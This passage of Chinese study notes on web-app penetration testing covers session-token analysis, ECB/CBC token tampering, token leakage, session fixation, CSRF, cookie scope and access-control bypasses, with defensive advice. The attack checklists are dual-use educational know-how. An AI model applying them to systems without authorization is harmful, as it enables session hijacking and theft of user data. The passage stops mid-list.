<h4 id="测试随机性强度"><a href="#测试随机性强度" class="headerlink" title="测试随机性强度"></a>测试随机性强度</h4><p>如果收集了足够多的令牌样本后，就可以使用统计方法来判断令牌是否具备随机性；它的基本理念是在大量令牌中判断某些特殊点的出现次数，看它是随机分布的，还是具备一定的规律性；Burp Sequencer 即是一个现成的判断随机性的工具；</p>
<h5 id="两个注意事项："><a href="#两个注意事项：" class="headerlink" title="两个注意事项："></a>两个注意事项：</h5><ul>
<li>即使是按照既定算法计算的结果，也是有可能通过随机性测试的，此时并不代表这个令牌没有漏洞，在了解了算法和生成器的内部状态后，就可以非常准确的正向或者逆向推断出它的输出；</li>
<li>没有通过随机机测试的令牌，也不能保证它一定可以被逆向工程；因为部分数据位出现非随机性，不代表整个序列可以被预测；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-28"><a href="#渗透测试步骤-28" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>遍历整个应用程序，观察它是在什么场景下发布新令牌的；一般来说有两种常见的场景会发令牌，一种是登录后，一种是在请求中没有发现令牌的时候；只要找到了这个场景，才能够大量的收集令牌；</li>
<li>使用 Burp Suite 中的 Burp Sequencer 功能对令牌进行实时补获，以便尽可能多的收集令牌，避免错失应用程序给那些真正的用户发布的令牌，同时这样也可以降低对时序的依赖；</li>
<li>如果应用程序使用商业会话管理机制，或者可以本地访问应用程序，则可以在受控的条件下收集无数的令牌；</li>
<li>在 Burp 收集令牌的同时，打开“自动分析”的功能；先至少收集500个令牌，然后详细审查分析结果；即使令牌中有足够的数据位通过了测试，也继续尽可能长时间的收集令牌，并在审查分析结果；</li>
<li>如果令牌未通过随机性测试，并且似乎包含某种模式可用于预测，此时需要更换一个 IP 地址，使用不同的用户名重新开始收集操作；因为令牌有可能使用用户名或者用户的 IP 地址作为令牌生成的参数；</li>
<li>如果攻击者对令牌的生成算法有了把握，接下来最好的办法是使用一段定制的脚本来实施攻击，因为它能够使用观测到的模式来生成令牌，并用上相应的编码技巧；</li>
<li>如果可以查看源代码，则应仔细检查负责生成令牌的代码，了解它使用的机制，并确定是否能够轻易的预测该令牌；</li>
<li>如果确定可以从应用程序数据中的熵实施蛮力攻击，则需要预估一下需要发起的具体请求数；</li>
</ul>
</blockquote>
<h3 id="加密令牌"><a href="#加密令牌" class="headerlink" title="加密令牌"></a>加密令牌</h3><p>有些应用程序在令牌中包含有意义的信息，并对这些进行加密；根据所使用的不同加密算法，这种做法可能是有漏洞的；</p>
<h4 id="ECB-密码"><a href="#ECB-密码" class="headerlink" title="ECB 密码"></a>ECB 密码</h4><p>ECB 指电子密码本，它经常被一些对称加密算法所使用；它的缺点是明文与密文存在相似的模式，例如相同的分组方法；</p>
<p>由于令牌中的内容不一定会被应用程序全部使用，因此通过更改和拼接分组的内容，可能会导致出现用户伪装的漏洞；</p>
<h4 id="CBC-密码"><a href="#CBC-密码" class="headerlink" title="CBC 密码"></a>CBC 密码</h4><p>CBC 表示密码块链，它的出现是为了解决 ECB 存在的漏洞问题，即在将某段明文转换成密文之前，先把它与上一个密文块做 XOR 运算，之后再转换成密文；这样就可以避免 ECB 中存在的分组漏洞问题了；</p>
<p>但是这种方式也引入了新的漏洞，因为攻击者可以让每次请求只修改令牌中的一个字符，虽然更改后的令牌被解密的时候，相应的字段会变成乱码，但由于该段的值会被用做上一段的 XOR 运算输入，即使是乱码值，也有可能生成有意义的 XOR 运算结果；那么，当应用程序没有判断所有字段内容进行令牌有效性判断的话，只读取其中某个字段的值，那么攻击者将有可能伪装成功；</p>
<p>Burp Intruder 中的 bit flipper（位翻转程序）即可以用来测试令牌是否有这方面的漏洞；位翻转对数字类型的值的效果比较好，对文本类型的效果比较差；</p>
<p>当应用程序在令牌中使用某种对称性加密算法时，如果应用程序的其他功能也需要使用加密算法时，很有可能它们会使用同一个对称加密算法，此时如果能在应用程序的其他功能获得某个加密值的源值（例如通过受控账户控制输入值），则可以利用这个信息完全解密任何受保护的信息；</p>
<blockquote>
<h4 id="渗透测试步骤-29"><a href="#渗透测试步骤-29" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果会话令牌没有明显的意义，或者本身是连续的，那么令牌很有可能是被加密的；</li>
<li>通过注册几个不同的用户名，每次为用户名多添加一个字符，如果添加一个字符会让令牌的长度增加8或16个字节，则说明应用程序可能使用的是分组密码；此时可以再注册一个添加一个字符的用户名，看是否同样的增加了8或16个字节；</li>
<li>可尝试通过移动令牌中的密文分组进行登录，看应用程序如何反应；</li>
<li>可尝试使用位翻转令牌中有效的荷载源来访问应用程序，如果翻转后应用程序仍然能否正常使用，那么可以扩大范围，对这个部分中的每个值进行测试，以找到更有针对性的攻击方法；</li>
<li>在前述的两种攻击方法中，注意监控应用程序的反应，确定响应中的用户信息是否出现变化；如果有的话，可使用这种方法来尝试提升权限；</li>
<li>在通过增加单个字符来获取更长的令牌的时候，通过反复不断增加字符，最后可以达到应用程序所使用的分组大小，这样就增加了分组边界对齐的概率；然后，对于不同用户名生成的一系列令牌，使用前面两种操作（移动或者翻转）进行尝试</li>
</ul>
</blockquote>
<h2 id="会话令牌处理中的薄弱环节"><a href="#会话令牌处理中的薄弱环节" class="headerlink" title="会话令牌处理中的薄弱环节"></a>会话令牌处理中的薄弱环节</h2><h3 id="在网络上泄露令牌"><a href="#在网络上泄露令牌" class="headerlink" title="在网络上泄露令牌"></a>在网络上泄露令牌</h3><ul>
<li>当令牌使用非加密方式在网络上传输时，就有可能导致令牌泄露；之后窃听者并不需要破解令牌，只需要使用获得的令牌就可以伪装成其他用户进行登录了（由于还能够截获其他机密信息，理论上窃听者都可以使用密码自行登录，但有时候为了尽量保持隐秘，有可能没这么做）；</li>
<li>有些应用程序在用户初始打开页面的时候，就给用户发了令牌，但是此时却是使用 HTTP 传输，之后等用户登录的时候才转成 HTTPS，并且在用户登录后没有给用户发送新令牌；即使在用户登录后使用新令牌，如果此时用户点击了应用程序中那些不需要验证的页面，转成了 HTTP 传输，此时将直接造成令牌泄露；</li>
<li>有些应用程序对所有静态资源使用 HTTP，如果此时用户已经在之前的页面完成了验证，则将使得令牌泄露；</li>
<li>即使应用在所有页面都使用了 HTTPS 传输，如果攻击者有方法诱使用户发送一个 HTTP 请求，即可以获得这个令牌；（攻击者一般可以通过在电子邮件中或即时消息中给用户发送一个 URL，并在他控制的一个 Web 站点中插入一个自动加载的链接即可完成相应的目的）；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-30"><a href="#渗透测试步骤-30" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>以正常方式访问应用程序，进行登录，然后访问应用程序的每一个功能，记录每一个被访问的 URL 以及收到新会话令牌的每种场合；特别注意 HTTP 和 HTTPS 进行切换的场景；可使用网络嗅探器或使用代理服务器中的日志自动化完成这一个工作；</li>
<li>如果应用程序使用 HTTP cookie 来传送会话令牌，此时应注意是否启用 secure 字段，如果没启用的话，则令牌是通过非加密连接传送的，很容易可以实现拦截；</li>
<li>如果初始使用 HTTP，在登录后切换到 HTTPS，确定一下是否有发布新令牌，以及在 HTTP 阶段的令牌是否仍然可用；并且尝试再切换回 HTTP 的页面时，应用程序是否仍然可以访问；</li>
<li>即使应用程序在每一个页面都使用 HTTPS，确认一下服务器是否监听 80 端口，如果是的话，直接使用验证后的会话令牌访问所有的 HTTP URL，确认会话令牌是否被传送；如果有传送，确认下是否依然有效；</li>
</ul>
</blockquote>
<h3 id="在日志中泄露令牌"><a href="#在日志中泄露令牌" class="headerlink" title="在日志中泄露令牌"></a>在日志中泄露令牌</h3><p>很多应用程序会为管理员或运营人员提供监控应用状态的功能，这些功能有时会访问应用程序的日志，当这些功能没有得到很好保护的时候，攻击者就有可能使用它来获得所有用户的令牌列表；</p>
<p>日志中之所以有会话令牌，其中一个重要的原因是有很多应用使用 URL 参数来传送令牌，而不是使用 cookie 或者 POST 请求；</p>
<p>处于 URL 参数中的令牌，将会在以下各种场景中被记录：</p>
<ul>
<li>用户浏览器的日志；</li>
<li>Web 服务器的日志；</li>
<li>企业或 ISP 代理服务器的日志；</li>
<li>任何在应用程序主机环境中采用的反向代理日志；</li>
<li>应用程序的用户，点击站外链接访问的任何服务器的 Referer 日志；</li>
</ul>
<blockquote>
<p>虽然 HTTPS 可以防止 URL 中的参数被日志记录，但是如果用户点击了页面中的站外链接，包含参数的完整 URL 将会出现在站外链接服务器收到的消息头中的  Referer 字段中；</p>
</blockquote>
<blockquote>
<h4 id="渗透测试步骤-31"><a href="#渗透测试步骤-31" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>找出应用程序的所有功能（参见之前搜索隐藏链接的技巧），找出可以查看会话令牌的任何日志或监控功能；并查明认证可以访问这些功能；</li>
<li>找出应用程序中使用 URL 传送会话令牌的任何情况；即使应用程序在内部都使用安全的传输方式，但在访问外部系统时，有时会使用非安全的传输方式；</li>
<li>如果应用程序在 URL 中传送会话令牌，那么可以寻找一些允许用户自动上传内容的功能，使用这些功能，上传包含站外链接的内容，链接至自己搭建的服务器，等待一段时间，查看日志中的 Referer 字段是否收到任何用户的会话令牌；</li>
<li>如果截获到任何会话令牌，通过拦截服务器的下一个响应，使用截获的 cookie 值添加自己的 Set-Cookie 消息头，来实现切换用户的目的；在 Burp 中，可以使用一个 Suite 范围的配置，在所有指向目标应用程序的请求中设置一个特殊的 cookie，以便在测试期间可以在不同的用户之间快速轻松切换；</li>
<li>如果截获大量的令牌，并且通过截获的令牌可以访问用户的敏感数据，就能通过自动化工具获得大量的其他用户的数据；</li>
</ul>
</blockquote>
<h3 id="令牌-会话映射易受攻击"><a href="#令牌-会话映射易受攻击" class="headerlink" title="令牌-会话映射易受攻击"></a>令牌-会话映射易受攻击</h3><p>理想的会话管理机制中，不应该允许同一名用户拥有多个会话，因为这样有很多安全的隐患，例如攻击者利用会话进行连接却不会被发现；</p>
<p>有些应用程序使用静态的会话令牌，这种情况更加糟糕，因为它完全无法判断是否同时存在多个会话，而且令牌永远有效，一旦泄露，更改密码也没有用；</p>
<p>有些应用程序使用用户名+1个随机值来生成令牌，这种机制生成出来的令牌看似随机，但其实跟静态会话可能没有什么两样，因为只要随机值是有效的，这个令牌就自然生效了，完全不需要验证；</p>
<blockquote>
<h4 id="渗透测试步骤-32"><a href="#渗透测试步骤-32" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用相同的用户账户不同的浏览器或计算机先后登录应用程序，确定这两个会话是否会都处于活动的状态，如果是的话，表示应用程序并行会话；这样截获其他用户令牌的攻击不会有被检测出来的风险；</li>
<li>用相同的账户，在不同的浏览器先后登录并退出系统，比对每次收到的令牌是一样的，还是不同的；如果都一样，说明令牌是静态的，有严重的设计缺陷；</li>
<li>如果令牌包含某有结构和意义，尝试将其他与用户有关的部分隔离出来，单独修改该部分的值，让它指向另外一个用户，确定修改后的令牌是否能否正常使用，以及能否伪装成其他用户；</li>
</ul>
</blockquote>
<h3 id="会话终止易受攻击"><a href="#会话终止易受攻击" class="headerlink" title="会话终止易受攻击"></a>会话终止易受攻击</h3><p>让会话的生命周期尽量短有两个好处：</p>
<ul>
<li>一是可以避免攻击者利用被截获的令牌；</li>
<li>二是可以避免用户使用共享计算机时出现的危险；</li>
</ul>
<p>有些应用程序设计得很糟糕，要么完全没有让用户自行终止会话的行为，要么即使有也并没有真正的执行；</p>
<blockquote>
<h4 id="渗透测试步骤-33"><a href="#渗透测试步骤-33" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>通过以下方式检查服务端是否执行了终止会话的操作：登录获取一个有效令牌，每间隔一段时间访问一下需要该令牌才能访问的页面，看应用程序是否返回正确的响应（可在自动化工具中设置好时间间隔）；</li>
<li>查找一下是否有退出的功能，如果没有，意味着用户无法主动终止会话，存在被攻击的隐患；</li>
<li>如果有退出的功能，在退出后，测试一下原来的令牌是否能够有效，如果有效，表示这是一个假退出；</li>
</ul>
</blockquote>
<h3 id="客户端暴露在令牌劫持风险之中"><a href="#客户端暴露在令牌劫持风险之中" class="headerlink" title="客户端暴露在令牌劫持风险之中"></a>客户端暴露在令牌劫持风险之中</h3><p>保存在客户端的令牌有可能存在被窃取的风险，例如使用跨站点脚本、或者固定令牌伪装；</p>
<blockquote>
<h4 id="渗透测试步骤-34"><a href="#渗透测试步骤-34" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确认应用程序中是否存在跨站点脚本漏洞，看是否可以利用这些漏洞截获其他用户的令牌；</li>
<li>如果应用程序在用户登录前就发令牌，并且登录后仍沿用该令牌，则说明容易受到固定会话攻击；</li>
<li>即使应用程序在用户未登录前没有发令牌，而只是在登录后发令牌，如果在登录后，应用程序允许用户返回登录前的那个页面，这意味着用户很可能可以使用已获得的有效令牌，然后用另外一个用户名登录；如果在登录后，应用程序没有发一个新令牌，那么存在固定会话攻击的漏洞；</li>
<li>确定应用程序会话令牌的格式；用一个格式有效的伪造令牌尝试进行登录，如果应用程序允许使用一个捏造的令牌建立一个通过验证的会话，那么存在固定会话漏洞；</li>
<li>如果应用程序完全依靠 HTTP cookie 传送会话令牌，有可能容易受到跨站点请求伪造（CSRF）的攻击；先登录应用程序，然后在同一个浏览器进程中，在其他站点页面向先应用程序发送一个请求，确认它是否会提交用户的令牌；可利用这个缺陷执行目标用户权限下的一些操作（攻击者需要先确定好相关敏感功能所需要提交的各项参数）；</li>
</ul>
</blockquote>
<h3 id="宽泛的-cookie-范围"><a href="#宽泛的-cookie-范围" class="headerlink" title="宽泛的 cookie 范围"></a>宽泛的 cookie 范围</h3><p>根据 HTTP 协议，服务器在 Set-Cookie 字段中，还可以使用 domain 和 path 两个字段来告知浏览器该 cookie 适用的域名和路径；</p>
<h4 id="cookie-域限制"><a href="#cookie-域限制" class="headerlink" title="cookie 域限制"></a>cookie 域限制</h4><p>如果没有指定 domain 的值，cookie 默认仅适用于当前域及其子域，不包含父域或者兄弟域；</p>
<p>如果服务端在指定 domain 值的时候，设置得过于宽泛，例如 abc.com 之类的根域名，这意味着该 cookie 将在根域名下的任何子域名中都有效；那么任何一个子域名页面，都有机会收集原本属于其他子域名的 cookie；</p>
<p>由于基于域的 cookie 隔离没有同源策略那么严格，当一个应用程序和另外一个漏洞应用程序共享同一个根域名，而只是通过端口号或者协议来区别彼此的时候，攻击者将有机会利用这种漏洞通过一个应用程序获取另一个应用程序的 cookie；</p>
<blockquote>
<h4 id="渗透测试步骤-35"><a href="#渗透测试步骤-35" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序将 cookie 范围放宽到父域，将容易受到通过兄弟域名下的其他应用程序实施的攻击；</li>
<li>如果应用程序使用 domain 的默认值，或者将其设置为当前域名，则子域仍然可以访问 cookie；</li>
<li>确定一个应用程序的所有子域名，如果子域名下有其他应用程序，尝试通过他们获取当前应用程序的 cookie</li>
</ul>
</blockquote>
<h4 id="cookie-路径限制"><a href="#cookie-路径限制" class="headerlink" title="cookie 路径限制"></a>cookie 路径限制</h4><p>HTTP 协议支持对 cookie 的作用路径进行指定，默认也是当前路径及其下的子路径；但如果开发者扩大了路径范围，将使得父级路径和兄弟路径的不可信程序有机会控制应用程序；</p>
<h2 id="保障会话管理的安全"><a href="#保障会话管理的安全" class="headerlink" title="保障会话管理的安全"></a>保障会话管理的安全</h2><h3 id="生成强大的令牌"><a href="#生成强大的令牌" class="headerlink" title="生成强大的令牌"></a>生成强大的令牌</h3><p>有效的令牌生成机制应该具备以下两个特点：</p>
<ul>
<li>使用数量极其庞大的一组可能值；取值范围应大到让攻击者在令牌有效期无法通过蛮力猜测破解；</li>
<li>包含强大的伪随机源，确保令牌值以无法预测的方式平均分布在取值范围中；</li>
</ul>
<p>令牌中不应该保存任何有意义的数据，整个会话对象应该保存在服务端；</p>
<p>谨慎选择随机数算法，确保它是不可预测的；当然这也是要付出代价的，越不容易猜测的随机数，意味着计算它的时间越久，使得应用程序的响应越慢；</p>
<p>除了选择最为稳定可靠的随机数算法外，在生成令牌的过程中，加入一些额外的令牌（如访问者 IP，请求的时间截）作为熵源，也是一种良好的作法；</p>
<h3 id="在整个生命周期保障令牌的安全"><a href="#在整个生命周期保障令牌的安全" class="headerlink" title="在整个生命周期保障令牌的安全"></a>在整个生命周期保障令牌的安全</h3><ul>
<li>令牌只能使用 HTTPS 传送；</li>
<li>绝不能在 URL 中传送会话令牌；</li>
<li>总是执行退出功能，删除服务器上的所有会话资源并终止会话令牌；</li>
<li>会话处于非活动状态一段时间后（如10分钟），应执行会话终止；</li>
<li>防止并行登录；每次登录都发布一个新的令牌，同时终止删除现有用户的所有会话；如果旧令牌不能马上删除的话，如果有用户使用旧令牌尝试登录，应给用户发出警报，告知有在其他设备尝试登录；</li>
<li>尽可能限定会话 cookie 的域和路径范围，留意框架或 Web 服务器软件的默认配置；</li>
<li>应严格审查应用程序的源代码，避免存在任何形式的跨站点脚本漏洞；</li>
<li>如果有用户提交服务器不认可的令牌，应立即在浏览器删除该令牌，并将用户返回到应用程序的起始页面；</li>
<li>在执行转账之类的重要操作前，应进行两步确认或重新验证，以便有效防御跨站点请求伪造和其他会话攻击；</li>
<li>跨站点请求伪造攻击之所以可行，其中一个原因在于应用程序可能完全依赖 cookie 来传送令牌，如果应用程序不完全依赖 cookie 传送令牌，例如同时使用每页面令牌，则可以防御跨站点的请求伪造；</li>
<li>成功登录验证后，应总是建立一个新会话，以避免固定会话攻击的影响；如果有无须登录即可提交敏感数据的功能，则不应该在页面上面显示敏感数据，应进行部分隐藏处理；</li>
</ul>
<blockquote>
<p>每页面令牌：除了会话令牌，增加一个每页面令牌，当用户请求一个页面时，生成一个新令牌放在隐藏表单字段中；当用户在该页面发起新请求时，除了验证主令牌外，还验证页面令牌，如果不匹配，整个会话将终止；</p>
</blockquote>
<h3 id="日志、监控与警报"><a href="#日志、监控与警报" class="headerlink" title="日志、监控与警报"></a>日志、监控与警报</h3><p>会话功能应该与日志和警报功能紧密结合，以帮助管理在必要时采取防御措施；</p>
<ul>
<li>应用程序应监控包含无效令牌的请求；</li>
<li>如果收到大量包含无效令牌的请求，可将其 IP 屏蔽一段时间；</li>
<li>在日志中保留针对会话攻击的记录，有助于管理员对攻击进行调查；</li>
<li>只要有可能，应向用户警报与会话相关的反常事件，例如并行登录、以便促使用户进行检查；</li>
</ul>
<p>反应性会话终止：当收到一些显然不可能由普通用户提交的请求时，应该迅速终止会话，以便延长攻击者的探查时间；</p>
<h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>现实世界中的会话管理机制通常存在很多漏洞，并且会成为攻击者的重点目标，因为如果能够攻破管理员的会话，往往能够攻破整个应用程序；耐心与不懈往往是完成攻克的最大利器；虽然解译看似随机生成的令牌费时又费力，但是它通常可以获得巨大的回报；</p>
<h1 id="8-攻击访问控制"><a href="#8-攻击访问控制" class="headerlink" title="8. 攻击访问控制"></a>8. 攻击访问控制</h1><h2 id="常见漏洞-1"><a href="#常见漏洞-1" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><h3 id="完全不受保护的功能"><a href="#完全不受保护的功能" class="headerlink" title="完全不受保护的功能"></a>完全不受保护的功能</h3><p>有些敏感功能在应用程序中使用隐藏的、没有任何访问控制的 URL 来访问，这是非常危险的，因为 URL 可能出现在任何日志中，浏览器的记录、页面 JS 代码和注释等；</p>
<p>直接访问的方法：某些应用程序会将服务器某个对象的方法前移到客户端组件中，由客户端的代码直接调用，此时有可能存在漏洞，例如用户本来只能某个方法，但现在却将对象的所有方法全部暴露了；</p>
<h3 id="基于标识符的功能"><a href="#基于标识符的功能" class="headerlink" title="基于标识符的功能"></a>基于标识符的功能</h3><p>服务端的资源经常使用标识符进行访问，有些应用程序会将标识符直接放在请求的 URL 参数中，当标识符很容易被猜测的时候，就很容易被未授权访问；</p>
<p>在某些单页面应用中，不仅资源会使用标识符，连功能都有可能使用标识符，此时如果攻击者发现这些 URL，就可以像拥有高级权限的一样访问它们；</p>
<h3 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h3><p>开发者经常会假设访问第二个阶段的用户一定是通过了第一阶段的验证，但其实不然；攻击者可以利用这个漏洞，直接访问第二个阶段的功能；</p>
<h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>有些应用程序的静态文件是由 Web 服务器软件管理的，因此它很可能并没有任何的访问控制，只需要有一个 URL 就可以进行访问了；</p>
<p>这些静态文件包括图片、书籍、报告、二进制代码，甚至有时还会有日志文件；</p>
<h3 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h3><p>有些应用程序使用第三方的控件平台来实现访问控制，平台的配置类似防火墙规则的配置，一般基于 HTTP 请求方法、URL路径、用户角色等三个条件实现控制；但是有时开发者会存在规则配置错误的情况，没有完整详细的进行设置，导致可能出现漏洞；</p>
<h3 id="访问控制方法不安全"><a href="#访问控制方法不安全" class="headerlink" title="访问控制方法不安全"></a>访问控制方法不安全</h3><p>还有一些奇葩的应用程序会使用客户端提交的参数来做出访问控制；</p>
<ul>
<li>基于参数的访问控制：例如在参数中指明当前用户是否为管理员；</li>
<li>基于 Referer 的访问控制：有些应用程序基于请求中的 Referer 字段值来控制权限，例如来源于管理页面的请求即表示拥有管理员权限；</li>
<li>基于位置的访问控制：例如基于 IP 地址的地理位置，但是这种方 式很容易被绕过，例如使用代理服务器、VPN、移动设备；</li>
</ul>
<h2 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h2><p>在开始探查访问控制漏洞之前，应先就应用程序现有的响应结果进行分析，之后再有针对性的实施探查；</p>
<blockquote>
<h4 id="渗透测试步骤-36"><a href="#渗透测试步骤-36" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>应用程序是否允许用户访问属于他们的特定数据；</li>
<li>是否存在各种级别的用户，应用程序允许他们访问不同的功能；</li>
<li>管理员使用的功能是否也内置在应用程序中；</li>
<li>分析应用程序的哪些功能或资源最有可能帮助攻击者提升当前的权限；</li>
<li>是否存在任何的标识符（以 POST 消息体或 URL 参数的方式），表明其使用某一参数来控制访问级别；</li>
</ul>
</blockquote>
<h3 id="使用不同用户账户进行测试"><a href="#使用不同用户账户进行测试" class="headerlink" title="使用不同用户账户进行测试"></a>使用不同用户账户进行测试</h3><blockquote>
<h4 id="渗透测试步骤-37"><a href="#渗透测试步骤-37" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>功能的访问控制：首先使用一个权限较高的账户确认所有可用的功能，然后使用一个权限较低的账户访问这些功能，测试能否垂直提升权限；</li>
<li>资源的访问控制：首先使用一个用户确认当前用户可访问而其他用户无法访问的资源，然后尝试使用另外一个账户来访问这些资源，测试能否水平提升权限（请求相关的 URL 或提交相同的 POST 参数）；</li>
</ul>
</blockquote>
<p>Burp Suite 提供使用两个不同的账户来解析应用程序的访问权限控制的功能，可以大大的提高效率；</p>
<blockquote>
<h4 id="渗透测试步骤-38"><a href="#渗透测试步骤-38" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用 A 账户正常访问应用程序的所有功能，记录下站点地图；</li>
<li>使用 B 账户访问站点地图中的所有功能，比对结果；</li>
<li>自动化工具此处只能用来收集信息，无法用于判断漏洞是否存在，需要结合应用程序功能访问的信息，才能进一步判断；</li>
</ul>
</blockquote>
<h3 id="测试多阶段过程"><a href="#测试多阶段过程" class="headerlink" title="测试多阶段过程"></a>测试多阶段过程</h3><p>多阶段过程由于每个阶段之间存在一定的逻辑顺序关系，经常涉及很多请求，此时需要对过程中的每一个步骤都进行单独的测试，才能判断漏洞是否存在；</p>
<blockquote>
<h4 id="渗透测试步骤-39"><a href="#渗透测试步骤-39" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>在多阶段的过程中，对客户端发给服务端的每个请求，都进行单独的测试，确保每个请求都实施了正确的访问控制；</li>
<li>尝试使用低权限的账户到达某个阶段位置，检测是否可以实施权限提升的攻击；</li>
<li>使用高权限用户完成整个过程，记录下浏览器中的每个请求，之后使用权限较低的用户账号，对于保存的记录再次发起请求，看是否被应用程序允许；</li>
</ul>
</blockquote>
<p>Burp 有个工具可以保存每次请求的上下文，然后可以生成一个自己的 URL，只要在浏览器中输入该 URL，Burp 就会调用保存的上下文，然后重要发送请求；</p>
<h3 id="通过有限访问权限进行测试"><a href="#通过有限访问权限进行测试" class="headerlink" title="通过有限访问权限进行测试"></a>通过有限访问权限进行测试</h3><p>应用程序通常有一些隐藏的功能没有体现在界面中，但是却有可能可以访问；</p>
<blockquote>
<h4 id="渗透测试步骤-40"><a href="#渗透测试步骤-40" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用第4章的枚举尽可能多的功能；</li>
<li>如果确信应用程序可能会朋管理员的界面功能，可考虑在请求参数中增加 admin&#x3D;true 之类的字符，确定是否可以访问一些普通用户访问不到的功能；</li>
<li>检查应用程序是否基于 Referer 消息头进行访问控制；尝试删除 Referer 字段值，看是否应用程序会做出不同的反应，如果会的话，说明漏洞可能存在；</li>
<li>检查所有的客户端 HTML 与 JS 脚本，查找有没有隐藏的功能，或者可从客户端进行操纵的功能的引用；</li>
</ul>
</blockquote>
<p>在枚举出应用程序的所有功能后，开始测试应用程序是否正确的对资源进行访问控制；如果应用程序允许用户访问一组内容广泛的相同类型的资源，则用户有机会访问那些未授权的资源；</p>
<blockquote>
<h4 id="渗透测试步骤-41"><a href="#渗透测试步骤-41" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>尝试找到没有权限访问的资源的标识符；</li>
<li>如果有可能生成一系列紧密相连的标识符的话，则可以使用与会话令牌类似的技巧，尝试查找标识符的生成规律；</li>
<li>如果无法生成标识符，则只能通过分析现有的标识符来查找规律；如果标识符的位数比较少，则有可能成功；如很大则很难；</li>
<li>如果资源标识符可以预测，而且访问控制没做好，则可以使用自动化的工具快速获取敏感资源和信息；</li>
</ul>
</blockquote>
<blockquote>
<p>如果服务端有将密码发送到客户端，即使不显示，也将是非常危险的，因为只要枚举用户名，就可以获得密码了；</p>
</blockquote>
<h3 id="测试“直接访问对象的方法”"><a href="#测试“直接访问对象的方法”" class="headerlink" title="测试“直接访问对象的方法”"></a>测试“直接访问对象的方法”</h3><p>如果应用程序允许客户端直接调用服务端某个对象的方法（通常表现为传递对象的名称），例如 servlet&#x3D;com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug；</p>
<blockquote>
<h4 id="渗透测试步骤-42"><a href="#渗透测试步骤-42" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确定任何遵循 Java 命名约定（例如 get, set, add, update, is, has+大写单词等），或明确指定包结构（如 com.companname.xxx.yyy.Classname）的参数；</li>
<li>找到列出对象所有方法的方法；先看该方法是否被调用，如果没有，则尝试猜测它的名称；</li>
<li>上网搜索一下相关的方法名称；</li>
<li>猜测其他可用方法的名称；</li>
<li>常用使用各种账户访问收集到的所有方法；</li>
<li>如果不知某个方法的参数数量和类型，则可以先找那些不需要参数的方法；</li>
</ul>
</blockquote>
<h3 id="测试对静态资源的控制"><a href="#测试对静态资源的控制" class="headerlink" title="测试对静态资源的控制"></a>测试对静态资源的控制</h3><p>如果某些静态资源可以直接使用 URL 访问，则应该测试一下使用未授权账户是否也能够访问这些资源；</p>
<blockquote>
<h4 id="渗透测试步骤-43"><a href="#渗透测试步骤-43" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先正常步骤访问某个静态资源，看最终能够获取到它的 URL；</li>
<li>使用权限较低或无权访问该资源的账户，对该 URL 发起请求，看能否成功；</li>
<li>如果可以成功，则开始猜测静态资源的命名方式；尝试设计一个自动枚举名称的脚本，进行自动攻击，获取所有可能有用或可能包含敏感数据的资源；</li>
</ul>
</blockquote>
<h3 id="测试对-HTTP-方法实施的限制"><a href="#测试对-HTTP-方法实施的限制" class="headerlink" title="测试对 HTTP 方法实施的限制"></a>测试对 HTTP 方法实施的限制</h3><p>应用程序有可能并没有 HTTP 方法实施平台级控制；</p>
<blockquote>
<h4 id="渗透测试步骤-44"><a href="#渗透测试步骤-44" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个权限较高的账户登录，执行一些需要高操作权限的动作，例如添加用户、更改用户角色等功能；</li>
<li>确定这些操作是否有受到任何反 CSRF 令牌或类似功能的保护，如果 HTTP 的方法被修改，应用程序是否仍然能够完成请求的内容；待测试的方法包括：GET, POST, HEAD，以及任何无效的 HTTP 方法；</li>
<li>如果应用程序会执行用不同方法提交的请求，则使用低权限的账户，再次进行测试；</li>
</ul>
</blockquote>
<h2 id="保障访问控制的安全"><a href="#保障访问控制的安全" class="headerlink" title="保障访问控制的安全"></a>保障访问控制的安全</h2><ul>
<li>仔细评估应用程序每个功能单元的访问控制要求，包括谁能访问这些功能，以及用户通过这些功能能够访问哪些资源；</li>
<li>使用用户会话做出所有访问控制决定；</li>
<li>使用一个单独的组件检查访问控制；通过这个组件处理所有的每一个客户端请求，确认用户访问的资源是被允许的；</li>
<li>使用编程技巧确保前两项没有例外；例如规定每个页面的访问控制都必须通过公用组件来处理；</li>
<li>对于特别敏感的功能，例如管理员页面，可以增加 IP 地址的限制，确保只有内网中的用户可以访问该功能；</li>
<li>对于静态内容，有两种控制方法，一是通过让客户端传送文件名参数，由后端处理后，间接访问静态文件；二是使用 HTTP 验证，在允许访问前检查资源许可；</li>
<li>任何时候通过客户端传送的资源标识符，都需要对其授权重新确认；</li>
